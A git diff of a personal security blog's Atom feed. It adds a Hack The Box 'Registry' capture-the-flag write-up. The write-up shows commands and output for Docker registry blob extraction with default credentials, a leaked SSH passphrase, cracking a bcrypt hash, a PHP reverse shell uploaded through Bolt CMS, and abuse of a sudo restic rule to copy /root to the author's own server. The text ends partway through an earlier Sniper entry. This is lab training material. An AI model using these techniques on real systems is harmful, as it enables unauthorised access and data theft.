@@ -1,18 +1,320 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-03T03:03:14+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-04T02:48:37+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
 Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
-</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box : Sniper</title><link href="http://localhost:4000/2020/03/28/htb-sniper.html" rel="alternate" type="text/html" title="Hack The Box : Sniper" /><published>2020-03-28T00:00:00+05:45</published><updated>2020-03-28T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/28/htb-sniper</id><content type="html" xml:base="http://localhost:4000/2020/03/28/htb-sniper.html">&lt;h2 id=&quot;htbsniper&quot;&gt;HTB:Sniper&lt;/h2&gt;
+</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Registry</title><link href="http://localhost:4000/2020/04/04/htb-registry.html" rel="alternate" type="text/html" title="Hack The Box: Registry" /><published>2020-04-04T00:00:00+05:45</published><updated>2020-04-04T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/04/htb-registry</id><content type="html" xml:base="http://localhost:4000/2020/04/04/htb-registry.html">&lt;h2 id=&quot;htbregistry&quot;&gt;HTB:Registry&lt;/h2&gt;
 
-&lt;p&gt;Sniper box is easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).&lt;/p&gt;
+&lt;p&gt;Registry box was the hard box. It falls under linux and hard category. Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting the docker registry page where I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; key and &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;. For root, I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell by exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF TO RCE&lt;/code&gt; then with that shell I downloaded the backups files with restic-service and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;. I’ll show all my payload(including that didn’t work in initial deployment to get the root).&lt;/p&gt;
+
+&lt;h2 id=&quot;box-details&quot;&gt;Box Details&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/registry_detail.png&quot; alt=&quot;registry_box&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the above picture it’s IP is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.159&lt;/code&gt; and added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as registry.htb. Let’s solve this box.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let’s start with our universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and which shows port &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH(22)&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP(TCP 80)&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SSL(TCP 443)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ./dirsearch.py -e html,txt,php,pcap,tar,bzip -u http://registry.htb/ -w ~/Downloads/wo
+rdlists/SecLists/Discovery/Web-Content/raft-large-directories.txt 
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: html, txt, php, pcap, tar, bzip | Threads: 10 | Wordlist size: 62279
+
+Error Log: /home/bikram/bbek/recon_tool/dirsearch/logs/errors-20-04-02_20-42-51.log
+
+Target: http://registry.htb/
+
+[20:42:51] Starting: 
+[20:42:54] 301 -  194B  - /install  -&amp;gt;  http://registry.htb/install/
+[20:46:22] 200 -  612B  - /bolt 
+
+Task Completed
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and got the dir &lt;code class=&quot;highlighter-rouge&quot;&gt;/bolt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/registy_bolt.jpg&quot; alt=&quot;bolt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fig: &lt;code class=&quot;highlighter-rouge&quot;&gt;/bolt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/registry_install.jpg&quot; alt=&quot;install&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fig: &lt;code class=&quot;highlighter-rouge&quot;&gt;/install&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;subdomain-enumeration&quot;&gt;Subdomain Enumeration&lt;/h3&gt;
+&lt;p&gt;As the given was &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; but looked over &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt;too. In order to find the interesting things I usually use &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; tool. So I used it here too and got the subdomain as &lt;code class=&quot;highlighter-rouge&quot;&gt;docker.registry.htb&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nikto -h https://10.10.10.159                                                                             
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.159
++ Target Hostname:    10.10.10.159
++ Target Port:        443
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /CN=docker.registry.htb
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /CN=Registry
++ Start Time:         2020-04-02 21:44:11 (GMT5.75)
+---------------------------------------------------------------------------
++ Server: nginx/1.14.0 (Ubuntu)
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The site uses SSL and Expect-CT header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Hostname '10.10.10.159' does not match certificate's names: docker.registry.htb
++ The Content-Encoding header is set to &quot;deflate&quot; this may mean that the server is vulnerable to the BREACH attack.
++ OSVDB-3092: /install/: This might be interesting...
++ 7876 requests: 8 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-04-03 00:49:25 (GMT5.75) (11114 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;docker-registry-exploit&quot;&gt;Docker Registry Exploit&lt;/h3&gt;
+
+&lt;p&gt;Then I found the dir with dirsearch as &lt;code class=&quot;highlighter-rouge&quot;&gt;http://docker.registry.htb/v2/&lt;/code&gt; and able to login with creds &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;. So I googled about it and found the interesting blog which explain how can we exploit the docker registry to download the stored files. You can find it &lt;a href=&quot;https://www.notsosecure.com/anatomy-of-a-hack-docker-registry&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Then I used this blog to exploit the docker registry and downloaded the file as&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ curl --user &quot;admin:admin&quot; http://docker.registry.htb/v2/bolt-image/manifests/latest                [80/311]
+{                                                                                                                                                     
+   &quot;schemaVersion&quot;: 1,                                                                                                                                
+   &quot;name&quot;: &quot;bolt-image&quot;,                                                                                                                              
+   &quot;tag&quot;: &quot;latest&quot;,                                                                                                                                   
+   &quot;architecture&quot;: &quot;amd64&quot;,                                                                                                                           
+   &quot;fsLayers&quot;: [                                                                                                                                      
+      {                                                                                                                                               
+         &quot;blobSum&quot;: &quot;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&quot;                                                         
+      },                                                                                                                                              
+      {                                                                                                                                               
+         &quot;blobSum&quot;: &quot;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&quot;                                                         
+      },                                                                                                                                              
+      {                                                                                                                                               
+         &quot;blobSum&quot;: &quot;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&quot;                                                         
+      },                                                                                                                                              
+      {                                                                                                                                               
+         &quot;blobSum&quot;: &quot;sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7&quot;                                                         
+      },                                                                                                                                              
+      {                                                                                                                                               
+         &quot;blobSum&quot;: &quot;sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791&quot;                                                         
+      },                                                                                                                                              
+      {
+         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797&quot;
+      },
+      {
+         &quot;blobSum&quot;: &quot;sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff&quot;
+      }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From above I saw the files name which start with &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256&lt;/code&gt; and downloaded to my local machine as zip file and unzipped it. After all I found interesting folder name with file &lt;code class=&quot;highlighter-rouge&quot;&gt;01-ssh.ssh&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;sha256_302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&lt;/code&gt; and got this as output.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect &quot;Enter passphrase for /root/.ssh/id_rsa:&quot;
+send &quot;GkOcz221Ftb3ugog\n&quot;;
+expect &quot;Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&quot;
+interact
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;this way I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;passphraase&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; and able to ssh in as bolt.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh -i id_rsa bolt@registry.htb
+The authenticity of host 'registry.htb (10.10.10.159)' can't be established.
+ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'registry.htb' (ECDSA) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+  System information as of Fri Apr  3 07:54:40 UTC 2020
+
+  System load:  0.0               Users logged in:                1
+  Usage of /:   6.1% of 61.80GB   IP address for eth0:            10.10.10.159
+  Memory usage: 49%               IP address for docker0:         172.17.0.1
+  Swap usage:   0%                IP address for br-1bad9bd75d17: 172.18.0.1
+  Processes:    157
+Last login: Fri Apr  3 06:36:39 2020 from 10.10.14.18
+bolt@bolt:~$ whoami
+bolt
+bolt@bolt:~$ cat user.txt
+ytc0yt***************
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This way I got the user &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;to-root&quot;&gt;To Root&lt;/h2&gt;
+
+&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
+
+&lt;p&gt;After a lot of dir search with different wordlist I finally got the login page of &lt;code class=&quot;highlighter-rouge&quot;&gt;bolt&lt;/code&gt; cms site as.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/bolt_login.jpg&quot; alt=&quot;bolt_login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fig: Login Page&lt;/p&gt;
+
+&lt;p&gt;then I searched everypart of thei bolt shell and got the hash in dir &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/app/database/bolt.db&lt;/code&gt; and on &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; I got the hash &lt;code class=&quot;highlighter-rouge&quot;&gt;$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi
+/Z0yYD86.P5E9cpY7P&lt;/code&gt;. Now I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; to crack the hash and got the password &lt;code class=&quot;highlighter-rouge&quot;&gt;strawberry&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ john hash -wordlist=/usr/share/wordlists/rockyou.txt
+[sudo] password for bikram: 
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+strawberry       (?)
+1g 0:00:00:05 DONE (2020-04-03 14:02) 0.1992g/s 71.71p/s 71.71c/s 71.71C/s strawberry..brianna
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I used that creds(&lt;code class=&quot;highlighter-rouge&quot;&gt;admin:strawerry&lt;/code&gt;) and logged in bolt cms.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/bolt_logged.jpg&quot; alt=&quot;bolt_logged&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fig: Admin User&lt;/p&gt;
+
+&lt;h3 id=&quot;unprivileged-user&quot;&gt;Unprivileged User&lt;/h3&gt;
+&lt;p&gt;After logged in, I searched every part of cms and found the file upload field where I was unable to upload the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file. Since I was &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; edited and added &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; extension in file &lt;code class=&quot;highlighter-rouge&quot;&gt;config.yml&lt;/code&gt; which was located at url &lt;code class=&quot;highlighter-rouge&quot;&gt;http://registry.htb/bolt/bolt/file/edit/config/config.yml&lt;/code&gt;  with a &lt;code class=&quot;highlighter-rouge&quot;&gt;php-reverse-shell.php&lt;/code&gt; and listener on.
+I found one interesting blog &lt;a href=&quot;https://fgsec.net/from-csrf-to-rce-bolt-cms/&quot;&gt;CSRF-TO-RCE&lt;/a&gt; you can read it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/rest_server.jpg&quot; alt=&quot;rest_server&quot; /&gt;
+Fig: Uploaded File&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Listner on&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nc -lvnp 8888
+listneing on [any] 8888
+
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58100
+Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC x86_64 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0 can't access tty;job contorl turned off
+$ $python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
+www-data@bolt:$ sudo -l 
+Matching Defaults entries for www-data on bolt:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bolt:
+    (root) NOPASSWD: /usr/bin/restic backup -r rest*
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As, I saw the &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server running as root then searched for files and got &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bolt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;backup&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sudo restic backup -r rest:http://backup.registry.htb/bolt bolt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;restic-server&quot;&gt;Restic Server&lt;/h4&gt;
+&lt;p&gt;Then I searched about &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server and collected knowledge you can find &lt;a href=&quot;https://restic.readthedocs.io/en/latest/&quot;&gt;here&lt;/a&gt; and at first I download to my localhost then started the restic server as you can find file &lt;a href=&quot;https://github.com/restic/rest-server&quot;&gt;rest-server&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ rest-server --path . --no-auth
+Data directory: .
+Authentication disabled
+Private repositories disabled
+Starting server on:8000
+Creating repository directories in .
+Creating repository directories in .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now before directly using the &lt;code class=&quot;highlighter-rouge&quot;&gt;rest-server&lt;/code&gt; in machine I used and in my local machine and it worked.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ restic -r http://10.10.14.129:8000 init
+enter password for new repository:
+enter password again:
+created restic repository 39fcbee204 at rest:http://10.10.14.129:8000
+
+Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irreversibly lost.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;port-forwarding&quot;&gt;Port Forwarding&lt;/h4&gt;
+&lt;p&gt;After, it worked in my local machine I port forward from 8000 to 1234 ( this willn’t work if your python is active at 8000 then it will route to another port ).&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ ssh bolt@10.10.10.159 -i id_rsa -R 1234:127.0.0.1:8000
+Enter passphrase for key 'id_rsa':
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic	 x86_64)
+
+	System information as of Mon Nov 11 14:1018 UTC 2019
+	
+	System Load: 0.02 			Users logged in:					1
+	Usage of /: 6.5% of 61.80GB	IP address for eth0:				10.10.10.159
+	Memory usage: 53%			IP address for br-1bad9bd75d17: 	172.18.0.1
+	Swap usage: 1%				IP address of docker0: 			172.17.0.1
+	Processes: 206
+	
+	=&amp;gt; There is 1 zombies process.
+Last Login: Mon Nov 11 14:1018 2019 from 10.10.15.129
+bolt@bolt:~$whoami
+bolt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;At first I used the full directory of &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server but that doesn’t work so I used below command in &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; shell&lt;/p&gt;
+
+&lt;h3 id=&quot;restic-server-backup-files&quot;&gt;Restic-Server backup files&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bolt:~$ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ 
+sudo restic backup -r rest:http://127.0.0.1:1234 /root/
+enter password for repository: something
+
+password is correct 
+found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to scan [/root]
+scanned 18 directories, 19 files in 0:00
+[0:03] 100.00% 39.690 KiB / 39.690 KiB 37 /37 items 0 errors ETA 0:00 duration: 0:03
+snapshot 4bf1b3af saved
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally I restored and checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;restic&lt;/code&gt; server directory and got the files as&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ restic restore 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02
+enter password for repository:
+repository 39fcbee2 opened succesfully, password is correct
+created new cache in /root/.cache/restic
+restorying &amp;lt;Snapshot 4bf1b3af of [/root] at 2019-11-11 14:13:38.38.895820081 +0000 UTC &amp;gt; root@bolt to .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I checked back to the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;snapshot&lt;/code&gt; and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~/snapshots$ ls
+4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02  root
+root@gr4n173:~/snapshots$ cd root
+root@gr4n173:~/snapshots/root$ ls
+config.yml  cron.sh  root.txt
+root@gr4n173:~/snapshots/root$ cat root.txt
+ntrkz*********************
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This way I got the root of Registry box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;thek&lt;/code&gt; for such an awesome box. Especially downloading the backup files from restic server was new one.&lt;/p&gt;
+
+&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;
+
+&lt;p&gt;Feedback are really appreciated !!&lt;/p&gt;
+
+&lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;
+
+&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linxu" /><category term="htb" /><category term="boltcms" /><category term="csrftorce" /><category term="restic-server" /><category term="port-forward" /><summary type="html">HTB:Registry</summary></entry><entry><title type="html">Hack The Box : Sniper</title><link href="http://localhost:4000/2020/03/28/htb-sniper.html" rel="alternate" type="text/html" title="Hack The Box : Sniper" /><published>2020-03-28T00:00:00+05:45</published><updated>2020-03-28T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/28/htb-sniper</id><content type="html" xml:base="http://localhost:4000/2020/03/28/htb-sniper.html">&lt;h2 id=&quot;htbsniper&quot;&gt;HTB:Sniper&lt;/h2&gt;
+
+&lt;p&gt;Sniper box was easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).&lt;/p&gt;
 
 &lt;h2 id=&quot;box-details&quot;&gt;Box Details&lt;/h2&gt;
 
 &lt;p&gt;&lt;img src=&quot;/public/images/sniperdetail.png&quot; alt=&quot;box_detail&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;In the above it’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.14.151&lt;/code&gt; ,I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as sniper.htb. Let’s solve this box.&lt;/p&gt;
+&lt;p&gt;In the above it’s ip was &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.14.151&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as sniper.htb. Let’s solve this box.&lt;/p&gt;
 
 &lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
 
-&lt;p&gt;Let’s start with universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and service which shows &lt;code class=&quot;highlighter-rouge&quot;&gt;port 80&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; service&lt;/p&gt;
+&lt;p&gt;Let’s start with universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and service which shows &lt;code class=&quot;highlighter-rouge&quot;&gt;port 80&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; service.&lt;/p&gt;
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Mar 27 21:34:08 2020 as: nmap -sS -sC -sV -Pn -oA nmap.txt 10.10.10.151
 Nmap scan report for sniper.htb (10.10.10.151)
 Host is up (0.41s latency).
@@ -40,8 +342,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
-&lt;p&gt;sniper.htb
-After I noticed port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; is opened I visited that site and got this as output.&lt;/p&gt;
+&lt;p&gt;sniper.htb&lt;/p&gt;
+
